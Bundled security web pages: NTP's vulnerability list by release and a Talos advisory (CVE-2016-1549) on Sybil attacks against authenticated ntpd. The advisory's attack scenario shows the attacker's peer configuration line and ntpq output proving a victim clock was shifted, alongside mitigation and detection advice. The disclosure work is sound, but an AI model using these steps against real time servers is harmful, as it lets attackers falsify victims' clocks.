ppIrbIXEuruh08TqrBm+PgUKFT0rZptCtX5pvZ/CwPdqfaisbvWkphcMART47q/Y
NcysqVGddmQUvrYihirYloj8qiODPu6XNqSG6QS4fw26NP1/dPnUmAREsTukWJjk
rAE+YZloikmKHXPXmG0Dr2STlzLrPDpeEp0aEb+MybZLerzyS6OyzTrnDLHttkwb
PFdA54KH4kUzCKJu3O4xtXimMjRm8s7tyOSHQhCI3U6bgTB0Q3hU+9FDFsx3K/7+
LsIa3JVefdgcIRnKWqli31Nk3fyndYgjFXpcqdUnK7bA0RpliGPqW90gom6W+Jb7
uRE5BDWHH3z9KAAGtOpziN20aWXeHHuisDpyfLVNyE350qyKuoVR/FPEa6mc2Fc4
CN53AfTQYPnGrwH4BnIVg2AsOmwwrEWx/TvzQ2DZLrKsUCklWXiUOxHz+6jXlz5v
RGIYJtJX/B+QN5a3RgAcluMb/A08FzjyAx57mEkYesv4nQn+9i2lLCP/LFHxId49
3rTmk817Mx1SMIS8Xc1bnd94gOBK8kNuduiV0xVKoJIn4IK5puwy/CBtx2jfMfI7
FPN6Krm7cQDy7z1rAZc80gTuIcMqXFNDHVtGVq+AqDQyv6rXL2iM8N+3xgQEe8Ei
fKgeiTiC4OSqKYLy/Ut/
=nQp/
-----END PGP SIGNATURE-----


=== Content from support.ntp.org_bfbd6cb6_20250126_102112.html ===

[![](https://www.ntp.org/images/logo.png)](https://www.nwtime.org)
[![NTP: Network Time Protocol](https://www.ntp.org/images/ntp_logo.jpg)](https://www.ntp.org/)

[Support](https://www.ntp.org/support/)

[Reference Library](https://www.ntp.org/reflib/)

[Documentation](https://www.ntp.org/current-stable/)

[Donate](https://www.ntp.org/donate/)

1. [Support](https://www.ntp.org/support/)
2. [Security](https://www.ntp.org/support/securitynotice/)

# Security

##### Notification Policy

When we discover a security vulnerability in NTP we follow our Phased Vulnerability Process which includes first notifying Institutional members of the [NTP Consortium at Network Time Foundation](https://www.nwtime.org/membership/benefits/), then [CERT](https://www.sei.cmu.edu/about/divisions/cert/index.cfm), and finally making a public announcement.

[Institutional Members](https://www.nwtime.org/membership/benefits/#institutional-consortia-memberships) receive advanced notification of security vulnerabilities.

##### Security Patch Policy

When security patches are ready, they are first given to Premier and Partner Institutional members of the [NTP Consortium at Network Time Foundation](https://www.nwtime.org/membership/benefits/), then access instructions are provided to [CERT](https://www.sei.cmu.edu/about/divisions/cert/index.cfm), and finally the public release is made on the embargo date.

[Premier and Partner Members](https://www.nwtime.org/membership/benefits/#institutional-consortia-memberships) receive early access to security patches.

##### Reporting Security Issues

If you find a security vulnerability in the NTP codebase, please report it by **PGP-encrypted** email to the NTF Security Officer Team. You can use our [NTF Security Officer PGP Key](https://www.nwtime.org/about/documents/NTFSecurityOfficerPGPKey.txt). Please refrain from discussing potential security issues in any mailing lists or public forums.

**NOTE:** Non-code vulnerabilities (such as a website issue) should instead be reported to webmaster. Issues for subdomains of "pool.ntp.org" should be reported to the [NTP Pool Project](https://www.ntppool.org/en/mailinglists.html).

---

#### Known Vulnerabilities by Release Version

The following releases provided fixes for at least one security vulnerability. The table for each release provides an entry for each security issue (click its hyperlink to read the details for the vulnerability), indicates the issue’s severity, and provides the dates of advance notification to institutional members, advance release to premier and partner institutional members, and public release.

Refer to the [Release Timeline](https://www.ntp.org/dev/releasetimeline/) for a complete list of all releases, their public release dates, release announcements, and changelogs.

**Release Version:**

* [4.2.8p18](#428p18)
* [4.2.8p17](#428p17)
* [4.2.8p16](#428p16)
* [4.2.8p15](#428p15)
* [4.2.8p14](#428p14)
* [4.2.8p13](#428p13)
* [4.2.8p12](#428p12)
* [4.2.8p11](#428p11)
* [4.2.8p10](#428p10)
* [4.2.8p9](#428p9)
* [4.2.8p8](#428p8)
* [4.2.8p7](#428p7)
* [4.2.8p6](#428p6)
* [4.2.8p5](#428p5)
* [4.2.8p4](#428p4)
* [4.2.8p3](#428p3)
* [4.2.8p2](#428p2)
* [4.2.8p1](#428p1)
* [4.2.8](#428)
* [4.2.7p230](#427p230)
* [4.2.7p26](#427p26)
* [4.2.7p11](#427p11)
* [4.2.6](#426)
* [4.2.4p7](#424p7)
* [4.2.4p5](#424p5)

---

#### 4.2.8p18

* Public Release: 2024 May 25

No security fixes in this release.

---

#### 4.2.8p17

* Public Release: 2023 Jun 06

No security fixes in this release.

---

#### 4.2.8p16

* Advance Release: 2023 May 10
* Public Release: 2023 May 30

| Security Issue | Severity |
| --- | --- |
| [3808: ntpq will abort with an assertion failure given a malformed RT-11 date](https://www.ntp.org/support/securitynotice/ntpbug3808/) | NONE |
| [3807: praecis\_parse() in ntpd/refclock\_palisade.c can write out-of-bounds](https://www.ntp.org/support/securitynotice/ntpbug3807/) | LOW |
| [3806: libntp/mstolfp() needs bounds checking](https://www.ntp.org/support/securitynotice/ntpbug3806/) | LOW |
| [3767: An out-of-bounds KoD RATE ppoll value triggers an assertion abort in debug-enabled ntpd](https://www.ntp.org/support/securitynotice/ntpbug3767/) | LOW |

---

#### 4.2.8p15

* Advance Notification: 2020 Apr 07
* Advance Release: 2020 Apr 12
* Public Release: 2020 Jun 23

| Security Issue | Severity |
| --- | --- |
| [3661: Memory leak with CMAC keys](https://www.ntp.org/support/securitynotice/ntpbug3661/) | MEDIUM |

---

#### 4.2.8p14

* Advance Notification: 2019 Jun 05
* Advance Release: 2020 Feb 17
* Public Release: 2020 Mar 03

| Security Issue | Severity |
| --- | --- |
| [3610: `process_control()` should bail earlier on short packets](https://www.ntp.org/support/securitynotice/ntpbug3610/) | NONE |
| [3596: Unauthenticated and unmonitored `ntpd` may be susceptible to IPv4 attack from highly predictable transmit timestamps](https://www.ntp.org/support/securitynotice/ntpbug3596/) | MEDIUM |
| [3592: DoS Attack on Unauthenticated Client](https://www.ntp.org/support/securitynotice/ntpbug3592/) | MEDIUM |

---

#### 4.2.8p13

* Advance Notification: 2019 Jan 16
* Advance Release: 2019 Feb 20
* Public Release: 2019 Mar 07

| Security Issue | Severity |
| --- | --- |
| [3565: Crafted null dereference attack from a trusted source with an authenticated mode 6 packet](https://www.ntp.org/support/securitynotice/ntpbug3565/) | MEDIUM |

---

#### 4.2.8p12

* Advance Release: 2018 Jul 25
* Public Release: 2018 Aug 14

| Security Issue | Severity |
| --- | --- |
| [3505: NTPQ/NTPDC: Buffer Overflow in `openhost()`](https://www.ntp.org/support/securitynotice/ntpbug3505/) | LOW |
| [3012: Sybil vulnerability: ephemeral association attack](https://www.ntp.org/support/securitynotice/ntpbug3012p12/) | LOW/MEDIUM |

---

#### 4.2.8p11

* Advance Notification: 2018 Jan 23
* Advance Release: 2018 Feb 12
* Public Release: 2018 Feb 27

| Security Issue | Severity |
| --- | --- |
| [3454: Unauthenticated packet can reset authenticated interleaved association](https://www.ntp.org/support/securitynotice/ntpbug3454/) | LOW/MEDIUM |
| [3453: Interleaved symmetric mode cannot recover from bad state](https://www.ntp.org/support/securitynotice/ntpbug3453/) | LOW |
| [3415: Provide a way to prevent authenticated symmetric passive peering](https://www.ntp.org/support/securitynotice/ntpbug3415/) | LOW |
| [3414: `ntpq: decodearr()` can write beyond its ‘buf’ limits](https://www.ntp.org/support/securitynotice/ntpbug3414/) | MEDIUM |
| [3412: `ctl_getitem()`: buffer read overrun leads to undefined behavior and information leak](https://www.ntp.org/support/securitynotice/ntpbug3412/) | INFO/MEDIUM |
| [3012: Sybil vulnerability: ephemeral association attack](https://www.ntp.org/support/securitynotice/ntpbug3012/) | LOW/MEDIUM |

---

#### 4.2.8p10

* Public Release: 2017 Mar 21

| Security Issue | Severity |
| --- | --- |
| [3389: Denial of Service via Malformed Config](https://www.ntp.org/support/securitynotice/ntpbug3389/) | MEDIUM |
| [3388: Buffer Overflow in DPTS Clock](https://www.ntp.org/support/securitynotice/ntpbug3388/) | LOW |
| [3387: Authenticated DoS via Malicious Config Option](https://www.ntp.org/support/securitynotice/ntpbug3387/) | MEDIUM |
| [3386: `ntpq_stripquotes()` returns incorrect value](https://www.ntp.org/support/securitynotice/ntpbug3386/) | INFO |
| [3385: `ereallocarray() / eallocarray()` underused](https://www.ntp.org/support/securitynotice/ntpbug3385/) | INFO |
| [3384: Privileged execution of User Library code (Windows PPSAPI Only)](https://www.ntp.org/support/securitynotice/ntpbug3384/) | LOW |
| [3383: Stack Buffer Overflow from Command Line (Windows Installer Only)](https://www.ntp.org/support/securitynotice/ntpbug3383/) | LOW |
| [3382: Data Structure terminated insufficiently (Windows Installer Only)](https://www.ntp.org/support/securitynotice/ntpbug3382/) | LOW |
| [3381: Copious amounts of Unused Code](https://www.ntp.org/support/securitynotice/ntpbug3381/) | INFO |
| [3380: Off-by-one in Oncore GPS Receiver](https://www.ntp.org/support/securitynotice/ntpbug3380/) | LOW |
| [3379: Potential Overflows in `ctl_put()` functions](https://www.ntp.org/support/securitynotice/ntpbug3379/) | MEDIUM |
| [3378: Improper use of `snprintf()` in `mx4200_send()`](https://www.ntp.org/support/securitynotice/ntpbug3378/) | LOW |
| [3377: Buffer Overflow in `ntpq` when fetching `reslist` from a malicious `ntpd`](https://www.ntp.org/support/securitynotice/ntpbug3377/) | MEDIUM |
| [3376: `Makefile` does not enforce Security Flags](https://www.ntp.org/support/securitynotice/ntpbug3376/) | INFO |
| [3361: 0rigin DoS](https://www.ntp.org/support/securitynotice/ntpbug3361/) | MEDIUM |

---

#### 4.2.8p9

* Public Release: 2016 Nov 21

| Security Issue | Severity |
| --- | --- |
| [3119: Mode 6 unauthenticated trap information disclosure and DDoS vector](https://www.ntp.org/support/securitynotice/ntpbug3119/) | MEDIUM |
| [3118: Mode 6 unauthenticated trap information disclosure and DDoS vector](https://www.ntp.org/support/securitynotice/ntpbug3118/) | MEDIUM |
| [3114: Broadcast Mode Replay Prevention DoS](https://www.ntp.org/support/securitynotice/ntpbug3114/) | LOW/MEDIUM |
| [3113: Broadcast Mode Poll Interval Enforcement DoS](https://www.ntp.org/support/securitynotice/ntpbug3113/) | LOW/MEDIUM |
| [3110: Windows: `ntpd` DoS by oversized UDP packet](https://www.ntp.org/support/securitynotice/ntpbug3110/) | HIGH |
| [3102: Zero Origin timestamp regression](https://www.ntp.org/support/securitynotice/ntpbug3102/) | MEDIUM |
| [3082: `read_mru_list()` does inadequate incoming packet checks](https://www.ntp.org/support/securitynotice/ntpbug3082/) | LOW |
| [3072: Attack on interface selection](https://www.ntp.org/support/securitynotice/ntpbug3072/) | LOW |
| [3071: Client rate limiting and server responses](https://www.ntp.org/support/securitynotice/ntpbug3071/) | LOW |
| [3067: Fix for bug 2085 broke initial sync calculations](https://www.ntp.org/support/securitynotice/ntpbug3067/) | LOW |

---

#### 4.2.8p8

Public Release: 2016 Jun 02

| Security Issue | Severity |
| --- | --- |
| [3046: `CRYPTO_NAK` crash](https://www.ntp.org/support/securitynotice/ntpbug3046/) | HIGH |
| [3045: Bad authentication demobilizes ephemeral associations](https://www.ntp.org/support/securitynotice/ntpbug3045/) | LOW |
| [3044: Processing spoofed server packets](https://www.ntp.org/support/securitynotice/ntpbug3044/) | LOW |
| [3043: Autokey association reset](https://www.ntp.org/support/securitynotice/ntpbug3043/) | LOW |
| [3042: Broadcast interleave](https://www.ntp.org/support/securitynotice/ntpbug3042/) | LOW |

---

#### 4.2.8p7

* Public Release: 2016 Apr 26

| Security Issue | Severity |
| --- | --- |
| [3020: Refclock impersonation vulnerability](https://www.ntp.org/support/securitynotice/ntpbug3020/) | LOW |
| [3011: Duplicate IPs on unconfig directives will cause an assertion botch in `ntpd`](https://www.ntp.org/support/securitynotice/ntpbug3011/) | MEDIUM |
| [3010: remote configuration trustedkey/requestkey/controlkey values are not properly validated](https://www.ntp.org/support/securitynotice/ntpbug3010/) | MEDIUM |
| [3009: Crafted `addpeer` with `hmode` > 7 causes array wraparound with `MATCH_ASSOC`](https://www.ntp.org/support/securitynotice/ntpbug3009/) | LOW |
| [3008: `ctl_getitem()` return value not always checked](https://www.ntp.org/support/securitynotice/ntpbug3008/) | MEDIUM |
| [3007: `CRYPTO-NAK` DoS](https://www.ntp.org/support/securitynotice/ntpbug3007/) | MEDIUM/LOW |
| [2978: Interleave-pivot](https://www.ntp.org/support/securitynotice/ntpbug2978/) | MEDIUM |
| [2952: Original fix for NTP Bug 2901 broke peer associations](https://www.ntp.org/support/securitynotice/ntpbug2952/) | MEDIUM |
| [2946: Origin Leak: `ntpq` and `ntpdc` Disclose Origin Timestamp to Unauthenticated Clients](https://www.ntp.org/support/securitynotice/ntpbug2946/) | MEDIUM |
| [2879: Improve NTP security against buffer comparison timing attacks](https://www.ntp.org/support/securitynotice/ntpbug2879/) | LOW/MEDIUM |

---

#### 4.2.8p6

* Public Release: 2016 Jan 19

| Security Issue | Severity |
| --- | --- |
| [2948: Potential Infinite Loop in `ntpq`](https://www.ntp.org/support/securitynotice/ntpbug2948/) | MEDIUM |
| [2947: `ntpq` protocol vulnerable to replay attacks](https://www.ntp.org/support/securitynotice/ntpbug2947/) | MEDIUM |
| [2945: 0rigin: Zero Origin Timestamp Bypass](https://www.ntp.org/support/securitynotice/ntpbug2945/) | MEDIUM |
| [2942: Off-path Denial of Service (DoS) attack on authenticated broadcast mode](https://www.ntp.org/support/securitynotice/ntpbug2942/) | MEDIUM |
| [2940: Stack exhaustion in recursive traversal of restriction list](https://www.ntp.org/support/securitynotice/ntpbug2940/) | MEDIUM |
| [2939: `reslist` NULL pointer dereference](https://www.ntp.org/support/securitynotice/ntpbug2939/) | MEDIUM |
| [2938: `ntpq saveconfig` command allows dangerous characters in filenames](https://www.ntp.org/support/securitynotice/ntpbug2938/) | MEDIUM |
| [2937: `nextvar()` missing length check in `ntpq`](https://www.ntp.org/support/securitynotice/ntpbug2937/) | LOW |
| [2936: Skeleton Key: Any trusted key system can serve time](https://www.ntp.org/support/securitynotice/ntpbug2936/) | HIGH |
| [2935: Deja Vu: Replay attack on authenticated broadcast mode](https://www.ntp.org/support/securitynotice/ntpbug2935/) | MEDIUM |

---

#### 4.2.8p5

* Public Release: 2016 Jan 07

| Security Issue | Severity |
| --- | --- |
| [2956: Small-step/big-step](https://www.ntp.org/support/securitynotice/ntpbug2956/) | MEDIUM |

---

#### 4.2.8p4

* Public Release: 2015 Oct 21

| Security Issue | Severity |
| --- | --- |
| [2941: NAK to the Future: Symmetric association authentication bypass via crypto-NAK](https://www.ntp.org/support/securitynotice/ntpbug2941/) | LOW |
| [2922: `decodenetnum()` will ASSERT botch instead of returning FAIL on some bogus values](https://www.ntp.org/support/securitynotice/ntpbug2922/) | HIGH |
| [2921: TALOS-CAN-0065: Password Length Memory Corruption Vulnerability](https://www.ntp.org/support/securitynotice/ntpbug2921/) | HIGH |
| [2920: TALOS-CAN-0064: Invalid length data provided by a custom refclock driver could cause a buffer overflow](https://www.ntp.org/support/securitynotice/ntpbug2920/) | HIGH |
| [2919: TALOS-CAN-0063: `ntpq atoascii()` potential memory corruption](https://www.ntp.org/support/securitynotice/ntpbug2919/) | HIGH |
| [2918: TALOS-CAN-0062: Potential path traversal vulnerability in the config file saving of `ntpd` on VMS](https://www.ntp.org/support/securitynotice/ntpbug2918/) | HIGH |
| [2917: TALOS-CAN-0055: Infinite loop if extended logging enabled and the logfile and keyfile are the same](https://www.ntp.org/support/securitynotice/ntpbug2917/) | HIGH |
| [2916: TALOS-CAN-0054: memory corruption in password store](https://www.ntp.org/support/securitynotice/ntpbug2916/) | HIGH |
| [2913: TALOS-CAN-0052: mode 7 loop counter underrun](https://www.ntp.org/support/securitynotice/ntpbug2913/) | HIGH |
| [2909: Slow memory leak in `CRYPTO_ASSOC`](https://www.ntp.org/support/securitynotice/ntpbug2909/) | HIGH |
| [2902: Configuration directives to change “pidfile” and “driftfile” should only be allowed locally](https://www.ntp.org/support/securitynotice/ntpbug2902/) | HIGH |
| [2901: Clients that receive a KoD should validate the origin timestamp field](https://www.ntp.org/support/securitynotice/ntpbug2901/) | MEDIUM |
| [2899: Incomplete autokey data packet length checks](https://www.ntp.org/support/securitynotice/ntpbug2899/) | HIGH |

---

#### 4.2.8p3

* Advance Notification: 2015 Jun 22
* Advance Release: 2015 Jun 24
* Public Release: 2015 Jun 29

| Security Issue | Severity |
| --- | --- |
| [2853: ntpd control message crash: Crafted NUL-byte in configuration directive](https://www.ntp.org/support/securitynotice/ntpbug2853/) | LOW |

---

#### 4.2.8p2

* Advance Notification: 2015 Mar 15
* Advance Release: 2015 Mar 22
* Public Release: 2015 Apr 7

| Security Issue | Severity |
| --- | --- |
| [2781: Authentication doesn’t protect symmetric associations against DoS attacks](https://www.ntp.org/support/securitynotice/ntpbug2781/) | MEDIUM |
| [2779: ntpd accepts unauthenticated packets with symmetric key crypto](https://www.ntp.org/support/securitynotice/ntpbug2779/) | LOW |

---

#### 4.2.8p1

* Public Release: 2015 Feb 04

| Security Issue | Severity |
| --- | --- |
| [2672: ::1 can be spoofed on some OSes, so ACLs based on IPv6 ::1 addresses can be bypassed](https://www.ntp.org/support/securitynotice/ntpbug2672/) | MEDIUM |
| [2671: `vallen` is not validated in several places in `ntp_crypto.c`, leading to a potential info leak or possibly crashing `ntpd`](https://www.ntp.org/support/securitynotice/ntpbug2671/) | LOW |

---

#### 4.2.8

* Public Release: 2014 Dec 18

| Security Issue | Severity |
| --- | --- |
| [2670: receive(): missing return on error](https://www.ntp.org/support/securitynotice/ntpbug2670/) | MEDIUM |
| [2669: Buffer overflow in configure()](https://www.ntp.org/support/securitynotice/ntpbug2669/) | HIGH |
| [2668: Buffer overflow in ctl\_putdata()](https://www.ntp.org/support/securitynotice/ntpbug2668/) | HIGH |
| [2667: Buffer overflow in crypto\_recv()](https://www.ntp.org/support/securitynotice/ntpbug2667/) | HIGH |

---

#### 4.2.7p230

* Public Release: 2011 Nov 1

| Security Issue | Severity |
| --- | --- |
| [2666: non-cryptographic random number generator with weak seed used by ntp-keygen to generate symmetric keys](https://www.ntp.org/support/securitynotice/ntpbug2666/) | HIGH |

---

#### 4.2.7p26

* Public Release: 2010 Apr 24

| Security Issue | Severity |
| --- | --- |
| [1532: DRDoS / Amplification Attack using ntpdc monlist command](https://www.ntp.org/support/securitynotice/ntpbug1532/) | MEDIUM |

---

#### 4.2.7p11

* Public Release: 2010 Jan 28

| Security Issue | Severity |
| --- | --- |
| [2665 :Weak default key in config\_auth()](https://www.ntp.org/support/securitynotice/ntpbug2665/) | HIGH |

---

#### 4.2.6

* Public Release: 2009 Dec 8

| Security Issue | Severity |
| --- | --- |
| [1331: DoS attack from certain NTP mode 7 packets](https://www.ntp.org/support/securitynotice/ntpbug1331/) | MEDIUM |

---

#### 4.2.4p7

* Public Release: 2009 Mar 4

| Security Issue | Severity |
| --- | --- |
| [1151: Remote exploit if autokey is enabled](https://www.ntp.org/support/securitynotice/ntpbug1151/) | MEDIUM |

#### 4.2.4p5

* Public Release: 2009 Jan 8

| Security Issue | Severity |
| --- | --- |
| [Multiple OpenSSL signature verification API misuse](https://nvd.nist.gov/vuln/detail/CVE-2009-0021) | MEDIUM |

* [![](https://www.ntp.org/images/icons/linkedin.svg)](https://www.linkedin.com/groups/4651343)
* [![](https://www.ntp.org/images/icons/facebook.svg)](https://www.facebook.com/networktimeprotocol)

© 2025 [Network Time Foundation](https://www.nwtime.org/)



=== Content from www.talosintelligence.com_0f583718_20250125_164248.html ===


* [Cisco Login](/users/auth/saml)

* [Intelligence Center](/reputation)

  + [# Intelligence Center](/reputation)
  + BACK
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* [Vulnerability Research](/vulnerability_info)

  + [# Vulnerability Research](/vulnerability_info)
  + BACK
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* [Incident Response](/incident_response)

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  # Security Resources

  + BACK
  Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* Media

  # Media

  + BACK
  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  # Company

  + BACK
  Company
  + [About Talos](/about)
  + [Careers](/careers)

* Under Attack?
* [Cisco Login](/users/auth/saml)

## Contact Cisco Talos Incident Response

×

Close

This form is for Incident Response service inquiries only, including emergency network security needs.

For reputation or categorization inquiries, visit the [Talos Support site](/support).
For emergency DDoS mitigation assistance, please contact the [Cisco Secure DDoS Protection Team](https://www.cisco.com/c/en/us/products/collateral/security/ddos-emergency-attack-mitigation-aag.pdf).

Name

Company (optional)

Email address

Phone number

Preferred communication:

Email

Phone

What Incident Response Service are you interested in?
General Talos IR services and retainer information
Emergency Response
IR Plan
IR Playbooks
IR Readiness Assessment
Tabletop Exercises
Compromise Assessment
Threat Hunting
Cyber Range Training
Intelligence on Demand

Please provide as much detail as possible so we can best address your needs

I acknowledge that this is an inquiry for Incident Response services and that any other use of this form will not receive a response.

Send Email
Cancel

# Talos Vulnerability Report

### TALOS-2016-0083

## Network Time Protocol Ephemeral Association Time Spoofing Vulnerability

##### April 26, 2016

##### CVE Number

CVE-2016-1549

### SUMMARY

ntpd is vulnerable to Sybil attacks. A malicious authenticated peer
can create arbitrarily-many ephemeral associations in order to win
ntpd’s clock selection algorithm and modify a victim’s clock.

### TESTED VERSIONS

NTP 4.2.8p3
NTP 4.2.8p4
NTPsec 3e160db8dc248a0bcb053b56a80167dc742d2b74
NTPsec a5fb34b9cc89b92a8fef2f459004865c93bb7f92

### PRODUCT URLS

http://www.ntp.org
http://www.ntpsec.org

### CVSS SCORE

CVSSv2: 3.5 - (AV:N/AC:M/Au:S/C:N/I:P/A:N)
CVSSv3: 5.3 - CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N

### DETAILS

ntpd has the ability to create ephemeral peer associations on the fly in response to certain kinds of incoming requests. In most
common configurations, if an incoming request will cause a new ephemeral association to be mobilized, ntpd requires the request to
be authenticated under a trusted symmetric key. However, ntpd does not enforce any limit on the number of active ephemeral associations
that may be created under a single key making ntpd vulnerable to Sybil attacks.

A malicious authenticated peer can use its knowledge of the trusted key that it shares with a victim ntpd process in order to create
multiple ephemeral associations with the victim from different source IP addresses. Each of these malicious associations can
advertise false time to the victim. If the malicious associations providing consistent false time advertisements outweigh the number of
legitimate peer associations, the victim will sync to the time advertised by the attacker.

RFC 5905 does not appear to mandate any specific behavior with regard to authenticating ephemeral associations. Therefore, we
recommend that an incoming request only mobilize an ephemeral association if both of the following conditions hold:

* There are no non-preemptible peer associations configured to use
  that key.

  This prevents ephemeral associations from being created by
  configured, non-preemptible peers.
* There are no preemptible peer associations authenticated under
  that key.

  This prevents a malicious ephemeral peer from creating more than one peer association using a given key. If the IP address of an
  ephemeral peer changes, eventually the association will be demobilized at which time a new incoming request can cause a new
  association to be mobilized with a new IP address.

  An alternative allowing faster failover: when an incoming request will mobilize a new ephemeral association, demobilize
  all preemptible peer associations authenticated under the key used to authenticate the incoming request before the new
  association is mobilized.

  This vulnerability has been successfully exploited using symmetric ephemeral associations. However, ephemeral broadcast and manycast
  associations are also likely to be vulnerable.

To our knowledge, any ntpd instance configured using the ‘trustedkey’ directive is vulnerable, as in:

```
keys /etc/ntp.keys
trustedkey 1 ...

```

There does not appear to be any other configuration directives that would affect or mitigate this vulnerability. ntpd instances that
are not configured with the ‘trustedkey’ directive are not vulnerable.

Though this vulnerability has only been confirmed against specific releases of NTP and NTPsec, any release of ntp-3 or ntp-4 may be
affected.

### ATTACK SCENARIO

To illustrate this attack, a malicious authenticated ephemeral peer (attacker1) with knowledge of keyid 2 trusted by ntp-client-4.2.8p4
will create multiple malicious ephemeral peer associations with ntp-client-4.2.8p4, overwhelm the victim’s legitimate time sources,
and cause ntp-client-4.2.8p4 to modify its clock. We will illustrate this by querying ntp-client-4.2.8p4 for its active peer associations with:

```
ntpq -c lpeer

```

Initially, ntp-client-4.2.8p4 is peered with one legitimate server (ntp-server).

```
     remote           refid      st t when poll reach   delay   offset  jitter
==============================================================================
*ntp-server      .LOCL.           1 u    5    8  377    0.043   -0.051   0.414

```

As a proof-of-concept, the attacker will attempt to move the victim’s clock back by an amount just under the panic threshold, 15
minutes in this case. (Significantly larger steps have been achieved with some ntpd releases.) The attacker spins up three attacking nodes at different IP addresses (attacker1..3).

After the attacking nodes are well synchronized, the attacker commences the attack by adding the following configuration line to
each attacking node instructing it to peer with the victim using keyid 2:

```
peer ntp-client-4.2.8p4 key 2 noselect minpoll 3 maxpoll 3

```

As a result, we see that ntp-client-4.2.8p4 now has 3 new malicious peers.

```
     remote           refid      st t when poll reach   delay   offset  jitter
==============================================================================
*ntp-server      .LOCL.           1 u    3    8  377    0.130    0.479   0.399
 attacker1       .LOCL.           1 S    5    8    1    0.000    0.000   0.000
 attacker2       192.168.33.14    2 S    5    8    1    0.000    0.000   0.000
 attacker3       192.168.33.14    2 S    4    8    1    0.000    0.000   0.000

```

The attackers consistently provide time advertisements that are about 15 minutes behind the time advertised by the legitimate
ntp-server. Because the attackers outnumber legitimate peers, eventually the victim selects an attacker as its system peer
indicating that it will synchronize its time to the attackers.

```
     remote           refid      st t when poll reach   delay   offset  jitter
==============================================================================
xntp-server      .LOCL.           1 u    1    8  377    0.130    0.479   0.501
*attacker1       .LOCL.           1 S    2    8    3    0.457  -931554   0.000
+attacker2       192.168.33.14    2 S    2    8    3    0.644  -931553   0.000
+attacker3       192.168.33.14    2 S    1    8    3    0.583  -931553   0.000

```

Eventually, the victim steps its clock.

```
     remote           refid      st t when poll reach   delay   offset  jitter
==============================================================================
 ntp-server      .STEP.          16 u    -    8    0    0.000    0.000   0.000
 attacker1       .STEP.          16 S   14    8    0    0.000    0.000   0.000
 attacker2       .STEP.          16 S   52    8    0    0.000    0.000   0.000
 attacker3       .STEP.          16 S   45    8    0    0.000    0.000   0.000

```

After stepping the clock, we see that the victim is 931 seconds behind ntp-server confirming the attack.

```
     remote           refid      st t when poll reach   delay   offset  jitter
==============================================================================
*ntp-server      .LOCL.           1 u    2    8    1    0.379  931553.   0.317
 attacker1       .STEP.          16 S   19    8    0    0.000    0.000   0.000
 attacker2       .STEP.          16 S   57    8    0    0.000    0.000   0.000
 attacker3       .STEP.          16 S   50    8    0    0.000    0.000   0.000

```

While ntp-server is initially selected as the system peer after the clock step, the attacking nodes quickly regain their status as
preferred time sources.

```
     remote           refid      st t when poll reach   delay   offset  jitter
==============================================================================
xntp-server      .LOCL.           1 u    5    8    3    0.278  931552.   0.638
*attacker1       .LOCL.           1 S    4    8    6    0.044   -0.346   0.049
+attacker2       192.168.33.14    2 S    4    8    6    0.593    0.520   0.441
+attacker3       192.168.33.14    2 S    3    8    6    0.758    0.020   0.074

```

At this point, the attacker has control of the victim’s clock and can continue to make modifications.

### MITIGATION

The most complete mitigation is to upgrade to ntp-TBD or NTPsec TBD. If your system’s ntpd is packaged by the system vendor, apply your
vendor’s security update as soon as it becomes available.

Administrators that are not using authenticated NTP can prevent exploitation by removing any unused ‘trustedkey’ configuration
directives from their ntpd configuration file.

If your system supports a host-based firewall which blocks incoming traffic, such as the Windows Firewall, Mac OS X Application
Firewall, or firewalls such as Uncomplicated Firewall or iptables on Linux, you should enable it.

For other systems, appropriate firewall rules will depend on your environment. Use the following recommendations as a guideline:

* NTP clients should block incoming NTP packets from any IP address
  that is not a known, legitimate peer
* NTP servers should block incoming symmetric active (NTP mode 1),
  server (NTP mode 4), and broadcast (NTP mode 5) packets from any
  IP address that is not a known, legitimate peer

### DETECTION

In most common configurations, you can use ntpq to query the ntpd process running on your system for its list of peers. Any
unexpected peers that are not configured in your ntp.conf file could indicate an attack. For example, if your system is configured
to be a client of ntp-server and you expect one peer (known-peer), the appearance of additional peers (sybil) could indicate an attack:

```
$ ntpq -c lpeer

     remote           refid      st t when poll reach   delay   offset  jitter
==============================================================================
*ntp-server      .LOCL.           1 u    1    8  377    0.130    0.479   0.501
 known-peer      .LOCL.           1 S    2    8    3    0.457  -931554   0.000
 sybil           192.168.33.14    2 S    2    8    3    0.644  -931553   0.000

```

You can delete any rogue associations by restarting ntpd after applying the mitigations above.

If you have a compatible IDS product, the following Snort rules detect exploits of this vulnerability: TBD.

At the network level, multiple symmetric, broadcast, or manycast associations using the same keyid could indicate an attack.

### TIMELINE

2016-01-19 - CERT reports to NTP

##### Credit

Discovered by Matthew Van Gundy of Cisco ASIG.

---

[Vulnerability Reports](/vulnerability_reports) [Next Report

TALOS-2016-0084](/vulnerability_reports/TALOS-2016-0084) [Previous Report

TALOS-2016-0082](/vulnerability_reports/TALOS-2016-0082)

* + ###### [Intelligence Center](/reputation)
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* + ###### [Vulnerability Research](/vulnerability_info)
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* + ###### [Incident Response](/incident_response)
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* + ###### Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* + ###### Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
